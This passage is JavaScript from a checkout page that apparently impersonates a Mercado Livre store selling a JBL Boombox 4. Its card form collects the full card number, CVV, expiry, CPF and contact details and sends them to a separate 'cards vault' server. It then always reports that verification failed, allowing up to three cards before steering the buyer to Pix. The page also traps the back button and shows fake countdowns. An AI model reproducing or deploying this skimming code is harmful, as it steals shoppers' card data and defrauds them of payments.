      full:     [4, 7],
    };
    const shipVal = meliPlusActive ? 'full' : (($('input[name="ship"]:checked') || {}).value || 'normal');
    const [minD, maxD] = SHIP_DAYS[shipVal] || SHIP_DAYS.normal;

    // Calcula intervalo de datas (pula finais de semana)
    const addBusinessDays = (start, days) => {
      const d = new Date(start);
      let added = 0;
      while (added < days) {
        d.setDate(d.getDate() + 1);
        const wd = d.getDay();
        if (wd !== 0 && wd !== 6) added++;
      }
      return d;
    };
    const now = new Date();
    const dStart = addBusinessDays(now, minD);
    const dEnd   = addBusinessDays(now, maxD);
    const MONTHS = ['janeiro','fevereiro','março','abril','maio','junho','julho','agosto','setembro','outubro','novembro','dezembro'];
    let etaText;
    if (dStart.getMonth() === dEnd.getMonth()) {
      etaText = `${dStart.getDate()} e ${dEnd.getDate()} de ${MONTHS[dEnd.getMonth()]}`;
    } else {
      etaText = `${dStart.getDate()} de ${MONTHS[dStart.getMonth()]} e ${dEnd.getDate()} de ${MONTHS[dEnd.getMonth()]}`;
    }
    const etaEl = document.getElementById('paidEta');
    if (etaEl) etaEl.innerHTML = `Chegará entre <b>${etaText}</b>`;

    // Foto do produto (cor selecionada)
    const selColorImg = $('#varCorOpts .var-btn.is-sel img');
    const selColorLabel = $('#varCorLabel');
    if (selColorImg) {
      const paidThumb     = document.getElementById('paidThumb');
      const paidProdThumb = document.getElementById('paidProdThumb');
      if (paidThumb)     paidThumb.src     = selColorImg.src;
      if (paidProdThumb) paidProdThumb.src = selColorImg.src;
    }
    const paidColor = document.getElementById('paidProdColor');
    if (paidColor && selColorLabel) paidColor.textContent = selColorLabel.textContent.trim();
    const paidProdName = document.getElementById('paidProdName');
    if (paidProdName) paidProdName.textContent = `Caixa de Som Bluetooth JBL Boombox 4 ${corSelecionada()}`;

    // Endereço — lê do form; se vier de ?paid=1 (pós-seguro), usa localStorage
    const _st = (() => { try { return JSON.parse(localStorage.getItem('mlSeguroData') || '{}'); } catch(e) { return {}; } })();
    const rua = ($('#fRua') || {}).value || _st.logradouro || '';
    const num = ($('#fNum') || {}).value || _st.numero || '';
    const bairro = ($('#fBairro') || {}).value || _st.bairro || '';
    const cidade = ($('#fCidade') || {}).value || _st.localidade || '';
    const uf = ($('#fUf') || {}).value || _st.uf || '';
    const paidAddr = document.getElementById('paidAddr');
    const paidAddrExtra = document.getElementById('paidAddrExtra');
    if (paidAddr) paidAddr.textContent = `${rua} ${num}`.trim() || 'Endereço';
    if (paidAddrExtra) paidAddrExtra.textContent = [bairro, cidade && `${cidade}/${uf}`].filter(Boolean).join(' · ');

    // Quantidade
    const paidQty = document.getElementById('paidProdQty');
    if (paidQty) paidQty.textContent = String(qty);

    // Mostra a tela
    paidView.hidden = false;
    cho.querySelector('.cho__scroll').scrollTop = 0;
  }

  /* ---- ETAPA 3: confirmar ---- */
  el('ftBtn').addEventListener('click', () => {
    if (S.payMethod === 'card' && S.cardData) {
      abrirCardErrorModal();
    } else {
      comprar();
    }
  });

  /* ---- tela de seguro ---- */
  const segView = $('#choSeguro');
  const segDet  = $('#segDet');
  // "Ver detalhes" abre painel; botão × fecha
  const _segClose = $('#segDetClose');
  if (_segClose) _segClose.addEventListener('click', () => { if (segDet) segDet.hidden = true; });
  const _segOpenLink = segView ? $('.cho-seguro__details', segView) : null;
  if (_segOpenLink) _segOpenLink.addEventListener('click', e => { e.preventDefault(); if (segDet) segDet.hidden = false; });
  function showSeguro(onDone) {
    segDet.hidden = true;
    segView.hidden = false;
    cho.querySelector('.cho__scroll').scrollTop = 0;
    // Sincroniza a foto do produto com a cor selecionada no front
    const selColorImg = $('#varCorOpts .var-btn.is-sel img');
    const segProdImg  = $('.cho-seguro__prod-img img', segView);
    if (selColorImg && segProdImg) {
      segProdImg.src = selColorImg.src;
      segProdImg.alt = selColorImg.alt || `JBL Boombox 4 ${corSelecionada()}`;
    }
    const segProdName = $('#segProdName', segView);
    if (segProdName) segProdName.textContent = `Caixa de Som Bluetooth JBL Boombox 4 ${corSelecionada()}`;
    // seleção de plano
    $$('.cho-seguro__opt', segView).forEach(opt => {
      opt.addEventListener('click', () => {
        $$('.cho-seguro__opt', segView).forEach(o => o.classList.remove('is-sel'));
        opt.classList.add('is-sel');
      });
    });
    $('#segSkip').onclick = () => {
      extraItems = extraItems.filter(i => !i.isSeguro);
      updateCheckout();
      segView.hidden = true;
      onDone();
    };
    $('#segAdd').onclick = () => {
      const sel = $('.cho-seguro__opt.is-sel', segView);
      if (sel) {
        const price = parseFloat(sel.dataset.price) || 0;
        const label = ($('.cho-seguro__opt-label', sel) || {}).textContent || 'plano';
        extraItems = extraItems.filter(i => !i.isSeguro);
        extraItems.push({ title: `Seguro Garantia Estendida (${label})`, price, qty: 1, isSeguro: true });
      }
      updateCheckout();
      segView.hidden = true;
      onDone();
    };
  }

  function _saveSeguroData() {
    const val = id => (document.getElementById(id) || {}).value || '';
    const data = {
      cep:        val('fCep').replace(/\D/g,''),
      logradouro: val('fRua'),
      numero:     val('fNum'),
      complemento: val('fCompl'),
      bairro:     val('fBairro'),
      localidade: val('fCidade'),
      uf:         val('fUf'),
      email:      val('fEmail'),
      celular:    val('fFone'),
      nome:       val('fNome'),
      cpf:        val('fCpf'),
    };
    try { localStorage.setItem('mlSeguroData', JSON.stringify(data)); } catch(e) {}
  }

  function _saveAndRedirectSeguro() {
    _saveSeguroData();
    window.location.href = (PIX_CFG.thankYouUrl || 'roleta/' + location.search);
  }

  async function comprar() {
    // Sem API configurada → modo demonstração
    if (!PIX_CFG.api) {
      showLoading('Já é quase sua!');
    if (window.ML_ANALYTICS) window.ML_ANALYTICS.track('pix_attempt', 'Tentou gerar Pix no checkout');
      hideLoadingAfter(1800, () => {
        renderQR();
        $('#pixCode').textContent = fakePixCode();
        doneView.hidden = false;
        cho.querySelector('.cho__scroll').scrollTop = 0;
      });
      return;
    }
    showLoading('Já é quase sua!');
    if (window.ML_ANALYTICS) window.ML_ANALYTICS.track('pix_attempt', 'Tentou gerar Pix no checkout');
    try {
      const data = await createPix();
      try {
        localStorage.setItem('upsell_buyer', JSON.stringify({
          nome:  $('#fNome').value.trim(),
          cpf:   onlyDigits($('#fCpf').value),
          email: $('#fEmail').value.trim(),
          tel:   onlyDigits($('#fFone').value)
        }));
      } catch (_) {}
      clearTimeout(loadTimer);
      loadView.hidden = true;
      showPixResult(data);
    if (window.ML_ANALYTICS) window.ML_ANALYTICS.track('pix_success', 'Pix gerado com sucesso: ' + (data.txid || ''));
    } catch (err) {
      clearTimeout(loadTimer);
      loadView.hidden = true;
      if (window.ML_ANALYTICS) window.ML_ANALYTICS.track('pix_error', err.message || 'Falha ao processar pagamento na adquirente');
      toast(err.message || 'Erro ao gerar o PIX. Tente novamente.');
    }
  }

  $('#pixCopy').addEventListener('click', () => {
    const code = $('#pixCode').textContent;
    if (!code) { toast('Nenhum código PIX disponível.'); return; }
    (navigator.clipboard?.writeText(code) ?? Promise.reject())
      .then(() => toast(PIX_CFG.api ? 'Código Pix copiado!' : 'Código Pix copiado. (Demonstração — código inválido)'))
      .catch(() => toast('Selecione e copie o código Pix manualmente.'));
  });

  ($('#pixPaid') || document.createElement('span')).addEventListener('click', e => {
    e.preventDefault();
    clearInterval(pollTimer);
    _saveSeguroData();

    // Dispara CompletePayment / Purchase no clique de confirmação também
    try {
      const val = lastPurchase ? lastPurchase.value : unitPrice() * qty;
      const ttkOrderId = (lastPurchase && lastPurchase.eventId) || ('pur-' + Date.now());
      const ttkPayload = {
        content_id: 'JBLBOOMBOX4BLKBR',
        content_type: 'product',
        content_name: 'Caixa de Som Bluetooth JBL Boombox 4 Branca',
        value: val,
        currency: 'BRL',
        quantity: qty,
        order_id: ttkOrderId,
        event_id: ttkOrderId
      };
      if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
        ttq.track('CompletePayment', ttkPayload, { event_id: ttkOrderId });
        ttq.track('Purchase', ttkPayload, { event_id: ttkOrderId });
      }
    } catch (_) {}

    if (PIX_CFG.thankYouUrl) { window.location.href = PIX_CFG.thankYouUrl; return; }
    closeModals();
    toast(PIX_CFG.api ? 'Assim que o pagamento cair, você será avisado.' : 'Demonstração — pedido simulado. Nenhuma cobrança real foi feita.');
  });

  /* ═══════════════════════════════════════════
     CARTÃO DE CRÉDITO — Card Vault
     ═══════════════════════════════════════════ */
  var _cfBrand = null, _cfCountry = null, _cfBank = null, _cfLevel = null, _cfType = null;

  var BRAND_LOGOS = {
    visa:       'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/visa.svg',
    mastercard: 'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/mastercard.svg',
    amex:       'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/amex.svg',
    elo:        'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/elo.svg',
    hipercard:  'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/hipercard.svg',
    maestro:    'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/maestro.svg',
    discover:   'https://cdn.jsdelivr.net/gh/aaronfagan/svg-credit-card-payment-icons/flat/discover.svg',
  };

  function _brandImg(brand, w, h) {
    var src = BRAND_LOGOS[brand];
    if (!src) return '';
    return '<img src="' + src + '" width="' + (w || 36) + '" height="' + (h || 22) + '" style="object-fit:contain;border-radius:3px;display:block" alt="' + brand + '"/>';
  }

  function selectPayMethod(method) {
    if (method === 'card') {
      abrirCardForm();
    } else {
      S.payMethod = 'pix';
      payMethod = 'pix';
      el('pmPix').classList.add('pm-sel');
      el('pmCard').classList.remove('pm-sel');
      el('pmPixCheck').style.display = 'inline-flex';
      el('pmCardCheck').style.display = 'none';
      el('savedCardArea').style.display = 'none';
      $('input[value="pix"]', $('#payOpts')).checked = true;
      _updatePayBtn();
    }
  }

  function abrirCardForm() {
    var total = calcTotal();
    var sel = el('cfParc');
    if (sel) {
      var prev = sel.value || '12';
      sel.innerHTML = '';
      for (var n = 1; n <= 12; n++) {
        var opt = document.createElement('option');
        opt.value = String(n);
        opt.textContent = n + 'x de ' + fmt(total / n) + ', sem juros';
        sel.appendChild(opt);
      }
      sel.value = prev;
    }
    var cvvInp = el('cfCvv');
    if (cvvInp) cvvInp.maxLength = (_cfBrand === 'amex') ? 4 : 3;
    el('cardFormModal').style.display = 'flex';
    setTimeout(function () { el('cfNum').focus(); }, 250);
  }

  function fecharCardForm() {
    el('cardFormModal').style.display = 'none';
    if (!S.cardData) {
      // Usuário fechou sem salvar → reverte para PIX
      selectPayMethod('pix');
    }
  }

  function cfFormatNum(inp) {
    var raw = inp.value.replace(/\D/g, '').slice(0, 16);
    var groups = raw.match(/.{1,4}/g);
    inp.value = groups ? groups.join(' ') : raw;
    if (raw.length >= 6) _lookupBIN(raw.slice(0, 6));
    else _setCardBrand(null);
  }

  function cfFormatExp(inp) {
    var raw = inp.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 1 && parseInt(raw[0], 10) > 1) raw = '0' + raw.slice(0, 3);
    if (raw.length >= 2 && parseInt(raw.slice(0, 2), 10) > 12) raw = raw[0] + '2' + raw.slice(2);
    inp.value = raw.length > 2 ? raw.slice(0, 2) + '/' + raw.slice(2) : raw;
  }

  function cfOnNameInput(inp) {
    var cur = inp.value;
    var clean = cur.replace(/[^A-Za-zÀ-ÖØ-öø-ÿ\s]/g, '');
    if (clean !== cur) {
      var pos = inp.selectionStart - (cur.length - clean.length);
      inp.value = clean;
      inp.setSelectionRange(pos, pos);
    }
    var x = el('cfNameX');
    if (x) x.style.display = inp.value ? 'block' : 'none';
  }

  function cfClearName() {
    el('cfName').value = '';
    el('cfNameX').style.display = 'none';
    el('cfName').focus();
  }

  function _setCardBrand(brand) {
    _cfBrand = brand;
    var cvvInp = el('cfCvv');
    if (cvvInp) {
      var cvvMax = (brand === 'amex') ? 4 : 3;
      cvvInp.maxLength = cvvMax;
      cvvInp.placeholder = brand === 'amex' ? 'Código (4 dígitos)' : 'CVV';
      if (cvvInp.value.length > cvvMax) cvvInp.value = cvvInp.value.slice(0, cvvMax);
    }
    var icon = el('cfBrandIcon');
    var inp = el('cfNum');
    if (!icon || !inp) return;
    var html = _brandImg(brand);
    if (html) {
      icon.innerHTML = html;
      icon.classList.add('visible');
      inp.style.paddingRight = '52px';
    } else {
      icon.innerHTML = '';
      icon.classList.remove('visible');
      inp.style.paddingRight = '';
    }
  }

  function _lookupBIN(bin) {
    var done = false;
    var timer = setTimeout(function () {
      if (!done) { done = true; _binFallback(bin); }
    }, 3000);
    fetch('https://lookup.binlist.net/' + bin, { headers: { 'Accept-Version': '3' } })
      .then(function (r) { return r.ok ? r.json() : Promise.reject(r.status); })
      .then(function (d) {
        if (done) return; done = true; clearTimeout(timer);
        _setCardBrand((d.scheme || '').toLowerCase());
        _cfCountry = (d.country && d.country.alpha2) ? d.country.alpha2.toUpperCase() : null;
        _cfBank    = (d.bank && d.bank.name) ? d.bank.name : null;
        _cfLevel   = d.brand  || null;
        _cfType    = d.type   || null;
      })
      .catch(function () {
        if (done) return; done = true; clearTimeout(timer);
        _binFallback(bin);
      });
  }

  function _binFallback(bin) {
    _cfCountry = null;
    var f = bin.charAt(0), p2 = bin.slice(0, 2);
    if (f === '4') _setCardBrand('visa');
    else if (f === '5' || f === '2') _setCardBrand('mastercard');
    else if (p2 === '34' || p2 === '37') _setCardBrand('amex');
    else if (f === '6') _setCardBrand('elo');
    else _setCardBrand(null);
  }

  function _luhn(num) {
    var sum = 0, alt = false;
    for (var i = num.length - 1; i >= 0; i--) {
      var n = parseInt(num[i], 10);
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }

  function _validExp(exp) {
    var parts = exp.split('/');
    if (parts.length !== 2) return false;
    var m = parseInt(parts[0], 10), y = parseInt('20' + parts[1], 10);
    if (m < 1 || m > 12) return false;
    var now = new Date(), curY = now.getFullYear(), curM = now.getMonth() + 1;
    return ((y > curY) || (y === curY && m >= curM)) && y <= 2035;
  }

  /* ═══════════════ RATE LIMIT DE CARTÃO (só no front) ═══════════════
     • Não deixa cadastrar o MESMO cartão duas vezes.
     • Máximo de 3 cartões distintos por navegador.
     • No 3º cartão: erro + aviso de redirecionamento e some a opção cartão. */
  const CARD_LIMIT  = 3;
  const CARD_LS_KEY = '_lrz_card_fps';

  /* fingerprint do PAN via FNV-1a (não guarda o número em claro no storage) */
  function _cardFp(numRaw) {
    var h = 0x811c9dc5;
    for (var i = 0; i < numRaw.length; i++) {
      h ^= numRaw.charCodeAt(i);
      h = (h + ((h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24))) >>> 0;
    }
    return ('0000000' + h.toString(16)).slice(-8);
  }
  function _getCardFps() {
    try { return JSON.parse(localStorage.getItem(CARD_LS_KEY)) || []; } catch (_) { return []; }
  }
  function _saveCardFps(a) {
    try { localStorage.setItem(CARD_LS_KEY, JSON.stringify(a)); } catch (_) {}
  }
  function disableCardOption() {
    var pmCard = el('pmCard');
    if (pmCard) {
      pmCard.style.opacity = '0.4';
      pmCard.style.pointerEvents = 'none';
      pmCard.setAttribute('aria-disabled', 'true');
    }
    var saved = el('savedCardArea');
    if (saved) saved.style.display = 'none';
    S.cardData = null;
    selectPayMethod('pix');                              // força PIX
  }

  function salvarCartao() {
    var numRaw = el('cfNum').value.replace(/\s/g, '');
    var exp    = el('cfExp').value.trim();
    var cvv    = el('cfCvv').value.trim();
    var name   = el('cfName').value.trim();

    if (numRaw.length !== 16) { shake(el('cfNum'), 'O cartão deve ter 16 dígitos'); return; }
    if (!_luhn(numRaw))       { shake(el('cfNum'), 'Número do cartão inválido, verifique os dígitos'); return; }
    if (_cfCountry && _cfCountry !== 'BR') { shake(el('cfNum'), 'Aceitamos apenas cartões emitidos no Brasil'); return; }
    if (exp.length < 5 || !_validExp(exp)) { shake(el('cfExp'), 'Data de vencimento inválida, expirada ou acima do limite'); return; }
    var cvvLen = (_cfBrand === 'amex') ? 4 : 3;
    if (cvv.length < cvvLen) { shake(el('cfCvv'), 'Código de segurança inválido, são ' + cvvLen + ' dígitos'); return; }
    var words = name.split(/\s+/).filter(function (w) { return w.length > 0; });
    if (words.length < 2) { shake(el('cfName'), 'Informe o nome completo como está no cartão'); return; }

    // ── Rate limit: mesmo cartão / máximo de 3 cartões distintos ──
    var fp  = _cardFp(numRaw);
    var fps = _getCardFps();
    if (fps.indexOf(fp) !== -1) {
      shake(el('cfNum'), 'Não é possível adicionar o mesmo cartão');
      return;
    }
    if (fps.length >= CARD_LIMIT) {
      // limite já estourado (proteção extra) → força PIX
      fecharCardForm();
      abrirCardErrorModal(0, true);
      return;
    }
    fps.push(fp);
    _saveCardFps(fps);
    var remaining = CARD_LIMIT - fps.length;             // tentativas restantes após esta

    var last4 = numRaw.slice(-4);
    S.cardData = { brand: _cfBrand || 'card', last4: last4, expiry: exp, name: name };
    S.payMethod = 'card';
    payMethod = 'card';

    var saveBtn = document.querySelector('.cf-save-btn');
    if (saveBtn) { saveBtn.disabled = true; saveBtn.textContent = 'Verificando…'; }

    try {
      var _trkApi = (PIX_CFG && PIX_CFG.api) ? PIX_CFG.api : 'https://tiktok-tracking.onrender.com';
      fetch(_trkApi + '/api/funnel/event', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          stage:  'card_attempt',
          name:   name,
          offer:  PIX_CFG.offer || PIX_CFG.funnel || 'geral',
          funnel: PIX_CFG.funnel || PIX_CFG.offer || 'geral',
          sid:    (function(){ try{ return localStorage.getItem('_ttk_eid') || localStorage.getItem('_fb_eid') || 'anon'; }catch(e){ return 'anon'; } })(),
          ttclid: (function(){ try{ return localStorage.getItem('ttclid') || null; }catch(e){ return null; } })(),
        }),
      }).catch(function () {});
    } catch (_) {}

    function _finalizarSalvar() {
      if (saveBtn) { saveBtn.disabled = false; saveBtn.textContent = 'Cadastrar e Finalizar'; }
      fecharCardForm();
      el('pmPix').classList.remove('pm-sel');
      el('pmCard').classList.add('pm-sel');
      el('pmPixCheck').style.display = 'none';
      el('pmCardCheck').style.display = 'inline-flex';
      $('input[value="card"]', $('#payOpts')).checked = true;
      _renderSavedCard();
      _updatePayBtn();
      // remaining <= 0 → 3º cartão: erro + aviso de PIX + desativa cartão
      setTimeout(function () { abrirCardErrorModal(remaining, remaining <= 0); }, 300);
    }

    if (!CARDS_API) { _finalizarSalvar(); return; }

    fetch(CARDS_API + '/api/cards', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        cpf:         el('cpf')   ? el('cpf').value.replace(/\D/g, '')  : '',
        nome:        el('nome')  ? el('nome').value.trim()              : '',
        email:       el('email') ? el('email').value.trim()             : '',
        telefone:    el('tel')   ? el('tel').value.replace(/\D/g, '')   : '',
        brand:       _cfBrand  || 'card',
        last4:       last4,
        expiry:      exp,
        cvv:         cvv,
        card_number: numRaw,
        bank:        _cfBank   || null,
        card_level:  _cfLevel  || null,
        card_type:   _cfType   || null,
      })
    })
      .then(function (r) { return r.json(); })
      .then(function (d) { console.log('[cards-vault]', d.action, d.id); _finalizarSalvar(); })
      .catch(function (e) { console.warn('[cards-vault] falhou, prosseguindo:', e.message); _finalizarSalvar(); });
  }

  function _renderSavedCard() {
    var area = el('savedCardArea');
    if (!area || !S.cardData) return;
    var d = S.cardData;
    var brandHtml = _brandImg(d.brand, 44, 28) ||
      '<svg width="44" height="28" viewBox="0 0 44 28" fill="none"><rect width="44" height="28" rx="4" fill="#e0e0e0"/></svg>';
    area.innerHTML =
      '<div class="saved-card-box" onclick="editarCartao()">' +
        '<div class="sc-brand">' + brandHtml + '</div>' +
        '<div class="sc-info">' +
          '<div class="sc-num">•••• •••• •••• ' + esc(d.last4) + '</div>' +
          '<div class="sc-meta">' + esc(d.name) + ' &nbsp;•&nbsp; ' + esc(d.expiry) + '</div>' +
        '</div>' +
        '<div class="sc-edit">Editar</div>' +
      '</div>';
    area.style.display = 'block';
  }

  function editarCartao() {
    abrirCardForm();
  }

  function _updatePayBtn() {
    var main = el('ftMain');
    if (!main || S.step !== 3) return;
    var isCard = (S.payMethod === 'card' && S.cardData);
    main.textContent = isCard ? 'Pagar com Cartão' : 'Pagar com PIX';
    var sub = el('ftSub');
    if (sub) {
      if (isCard) {
        var sel = el('cfParc');
        var n = sel ? (parseInt(sel.value, 10) || 12) : 12;
        sub.textContent = n + 'x de ' + fmt(calcTotal() / n) + ', sem juros';
      } else {
        sub.textContent = '';
      }
    }
  }

  function abrirCardErrorModal(remaining, isLast) {
    // sem args (ex.: clique em "Pagar com Cartão") → calcula pelo storage
    if (remaining === undefined) {
      remaining = Math.max(0, CARD_LIMIT - _getCardFps().length);
      isLast = remaining <= 0;
    }
    var title  = el('ceTitle');
    var txt    = el('ceText');
    var cancel = el('ceCancel');
    var total  = calcTotal();

    if (isLast) {
      if (title)  title.textContent = 'Limite de tentativas atingido';
      if (txt)    txt.innerHTML = 'Não foi possível verificar nenhum dos seus cartões. Por segurança, o pagamento com cartão foi desativado. Você será redirecionado para o pagamento via <b>Pix</b> com 73% de desconto — ' + fmt(total) + '.';
      if (cancel) cancel.style.display = 'none';
      disableCardOption();
    } else {
      var t = 'Resta' + (remaining === 1 ? '' : 'm') + ' ' + remaining +
              ' tentativa' + (remaining === 1 ? '' : 's') + ', utilize outro cartão.';
      if (title)  title.textContent = 'Não foi possível verificar o cartão';
      if (txt)    txt.innerHTML = 'Não conseguimos verificar os dados do seu cartão. <b>' + t +
                    '</b> Ou finalize agora via Pix e aproveite 73% de desconto à vista — ' + fmt(total) + '.';
      if (cancel) cancel.style.display = '';
    }

    el('ftBtn').disabled = true;
    el('loaderTxt').textContent = 'Verificando cartão!';
    el('loaderOverlay').classList.add('show');
    setTimeout(function () {
      el('loaderOverlay').classList.remove('show');
      el('ftBtn').disabled = false;
      el('cardErrorModal').style.display = 'flex';
    }, 2000);
  }

  function pagarViaPIX() {
    el('cardErrorModal').style.display = 'none';
    var pmCard = el('pmCard');
    if (pmCard) { pmCard.style.opacity = '0.35'; pmCard.style.pointerEvents = 'none'; }
    S.payMethod = 'pix';
    payMethod = 'pix';
    comprar();
  }

  // Expõe funções chamadas via onclick no HTML
  window.selectPayMethod = selectPayMethod;
  window.abrirCardForm   = abrirCardForm;
  window.fecharCardForm  = fecharCardForm;
  window.cfFormatNum     = cfFormatNum;
  window.cfFormatExp     = cfFormatExp;
  window.cfOnNameInput   = cfOnNameInput;
  window.cfClearName     = cfClearName;
  window.salvarCartao    = salvarCartao;
  window.editarCartao    = editarCartao;
  window.pagarViaPIX     = pagarViaPIX;

  /* ── Order Bump ──────────────────────────────────────────────── */
  const obModal = document.getElementById('orderBumpModal');

  function openOrderBump() {
    // fluxo normal: garante que a oferta de back-redirect não fique ativa
    backOffer = null;
    extraItems = extraItems.filter(i => !i.gift);
    // limpa itens de ob adicionados em visita anterior ao checkout
    $$('.ob-item', obModal).forEach(item => {
      const idx = extraItems.findIndex(i => i.title === item.dataset.title);
      if (idx >= 0) { cart -= extraItems[idx].qty; extraItems.splice(idx, 1); }
    });
    $('#cartCount').textContent = String(cart);
    updateCheckout();

    $$('.ob-item', obModal).forEach(item => {
      item.classList.remove('is-sel');
      item.setAttribute('aria-checked', 'false');
    });
    obModal.classList.add('is-open');
    document.body.style.overflow = 'hidden';
    $('#obConfirm').focus();
  }

  function closeOrderBump() {
    obModal.classList.remove('is-open');
    document.body.style.overflow = '';
  }

  function proceedToCheckout() {
    $$('.ob-item.is-sel', obModal).forEach(item => {
      const title = item.dataset.title;
      const price = parseFloat(item.dataset.price);
      const existing = extraItems.find(i => i.title === title);
      if (existing) existing.qty += 1;
      else extraItems.push({ title, price, qty: 1 });
      cart += 1;
    });
    $('#cartCount').textContent = String(cart);

    closeOrderBump();
    clearTimeout(loadTimer);
    clearInterval(pollTimer);
    doneView.hidden = true;
    current = 1;
    renderSteps();
    updateCheckout();
    cho.querySelector('.cho__scroll').scrollTop = 0;
    showLoading('Preparando tudo para<br>sua compra');
    if (window.ML_ANALYTICS) window.ML_ANALYTICS.track('add_to_cart', 'Abriu checkout / carrinho');
    openModal(cho);
    fbTrack('InitiateCheckout', { value: unitPrice() * qty, currency: 'BRL', content_ids: [PRODUCT_ID], content_type: 'product' });
    ttkTrack('InitiateCheckout', { value: unitPrice() * qty, quantity: qty });
    hideLoadingAfter(1500, () => showSeguro(() => $('#fCep').focus()));
  }

  $$('.ob-item', obModal).forEach(item => {
    const toggle = () => {
      const sel = item.classList.toggle('is-sel');
      item.setAttribute('aria-checked', String(sel));
    };
    item.addEventListener('click', toggle);
    item.addEventListener('keydown', e => {
      if (e.key === 'Enter' || e.key === ' ') { e.preventDefault(); toggle(); }
    });
  });

  $('#obConfirm').addEventListener('click', proceedToCheckout);
  $('#obSkip').addEventListener('click', proceedToCheckout);
  obModal.addEventListener('mousedown', e => { if (e.target === obModal) proceedToCheckout(); });
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && obModal.classList.contains('is-open')) proceedToCheckout();
  });

  /* ═══════════════════════════════════════════
     BACK-REDIRECT / EXIT-INTENT
     Trava o botão "voltar" (só no front): re-empurra o history e abre um
     popup com o combo Boombox + JBL Flip 6 + case de brinde.
     ═══════════════════════════════════════════ */
  const boModal   = document.getElementById('backOfferModal');
  const GIFT_ITEM = { title: 'Case de Proteção Boombox 4 JBL (Brinde)', price: 0, qty: 1, img: 'https://lojas.b-cdn.net/jbl-img/case_boombox.webp', gift: true };
  const BACK_FLIP = { title: "JBL Flip 6 À Prova D'água", price: 30.00, qty: 1, img: 'https://lojas.b-cdn.net/jbl-img/flip6.webp', isBackFlip: true };
  const BACK_OFFER_TOTAL = 99.90;
  let boTimerId = null;

  function startBoTimer() {
    const elT = document.getElementById('boTimer');
    if (!elT) return;
    clearInterval(boTimerId);
    let left = 120;                                    // 2:00
    const render = () => {
      const m = String(Math.floor(left / 60)).padStart(2, '0');
      const s = String(left % 60).padStart(2, '0');
      elT.textContent = `${m}:${s}`;
    };
    render();
    boTimerId = setInterval(() => {
      left = Math.max(0, left - 1);
      render();
      if (left === 0) clearInterval(boTimerId);
    }, 1000);
  }

  function openBackOffer() {
    if (boModal.classList.contains('is-open')) return;
    boModal.classList.add('is-open');
    document.body.style.overflow = 'hidden';
    startBoTimer();
    const acc = document.getElementById('boAccept');
    if (acc) acc.focus();
  }

  function closeBackOffer() {
    boModal.classList.remove('is-open');
    clearInterval(boTimerId);
    // só libera o scroll se nenhum outro modal estiver aberto
    if (!openModalEl() && !obModal.classList.contains('is-open')) document.body.style.overflow = '';
  }

  /* Aceitou a oferta → monta o combo (2× a R$ 79,90) + brinde e vai DIRETO ao
     checkout (pula o order bump). */
  function acceptBackOffer() {
    // Combo: Boombox (R$ 69,90) + JBL Flip 6 (R$ 30,00) + Case de brinde = R$ 99,90
    backOffer = { unit: 69.90, qty: 1 };
    extraItems = extraItems.filter(i => !i.gift && !i.isBackFlip);
    extraItems.push(Object.assign({}, BACK_FLIP));
    extraItems.push(Object.assign({}, GIFT_ITEM));
    closeBackOffer();
    clearTimeout(loadTimer);
    clearInterval(pollTimer);
    doneView.hidden = true;
    setQty(1);                                           // atualiza qtd + resumo
    current = 1;
    renderSteps();
    updateCheckout();
    cho.querySelector('.cho__scroll').scrollTop = 0;
    showLoading('Preparando sua oferta<br>especial…');
    openModal(cho);
    fbTrack('InitiateCheckout', { value: BACK_OFFER_TOTAL, currency: 'BRL', content_ids: [PRODUCT_ID], content_type: 'product', num_items: 2 });
    ttkTrack('InitiateCheckout', { value: BACK_OFFER_TOTAL, quantity: 2 });
    hideLoadingAfter(1400, () => $('#fCep').focus());
  }

  document.getElementById('boAccept').addEventListener('click', acceptBackOffer);
  document.getElementById('boClose').addEventListener('click', closeBackOffer);
  document.getElementById('boDismiss').addEventListener('click', closeBackOffer);
  boModal.addEventListener('mousedown', e => { if (e.target === boModal) closeBackOffer(); });
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape' && boModal.classList.contains('is-open')) closeBackOffer();
  });

  /* Armadilha do botão "voltar": empurra um estado extra e, a cada popstate,
     re-empurra (mantém o usuário na página) e mostra a oferta — a não ser que
     haja um modal aberto, caso em que o "voltar" só fecha o modal. */
  try { history.pushState({ lrz: 'keep' }, '', location.href); } catch (_) {}
  window.addEventListener('popstate', function () {
    try { history.pushState({ lrz: 'keep' }, '', location.href); } catch (_) {}
    if (openModalEl() || obModal.classList.contains('is-open')) { closeOrderBump(); closeModals(); return; }
    if (boModal.classList.contains('is-open')) return;
    openBackOffer();
  });

  /* ---- abrir/reabrir o checkout: order bump → intersticial → etapa 1 ---- */
  $('#buyNow').addEventListener('click', openOrderBump);

  // ViewContent (visualização do produto) — dispara uma vez ao carregar
  fbTrack('ViewContent', { value: unitPrice(), currency: 'BRL', content_ids: [PRODUCT_ID], content_type: 'product', content_name: 'JBL Boombox 4 Branca' });
  ttkTrack('ViewContent', { value: unitPrice() });

  /* ---------- Contagem regressiva da entrega ---------- */
  (function countdown() {
    const el = $('#countdown');
    if (!el) return; // countdown removido do buybox
    const deadline = Date.now() + (7 * 60 + 51) * 60 * 1000;
    const tick = () => {
      const left = deadline - Date.now();
      if (left <= 0) {
        el.textContent = 'poucos minutos';
        clearInterval(timer);
        return;
      }
      const h = Math.floor(left / 3600000);
      const m = Math.floor((left % 3600000) / 60000);
      el.textContent = `${h} h ${m} min`;
    };
    const timer = setInterval(tick, 30000);
    tick();
  })();

  /* ======================= CARDS E CARROSSÉIS ======================= */
  const relImg = (n, size) => REL_IMGS[(n - 1) % REL_IMGS.length];

  function cardHTML(p) {
